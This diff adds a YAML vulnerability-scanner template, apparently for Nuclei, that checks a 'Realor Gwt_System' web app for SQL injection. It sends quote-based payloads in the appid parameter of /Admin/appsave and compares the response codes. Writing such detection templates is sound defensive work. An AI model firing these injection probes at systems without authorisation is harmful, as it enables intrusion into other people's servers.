@@ -1,0 +1,25 @@
+id: yaml-poc-realor-gwt_system-sql_injection-CT-1251010
+info:
+  name: Yaml Poc Realor Gwt_System Sql_Injection Ct 1251010
+  author: yuxiang.cai
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-realor-gwt_system-sql_injection-CT-1251010'
+  tags: sqli
+  reference: []
+http:
+- method: GET
+  path:
+  - /{{path}}?s=/Admin/appsave&appid=3'
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 404
+- method: GET
+  path:
+  - /{{path}}?s=/Admin/appsave&appid=3'-'
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
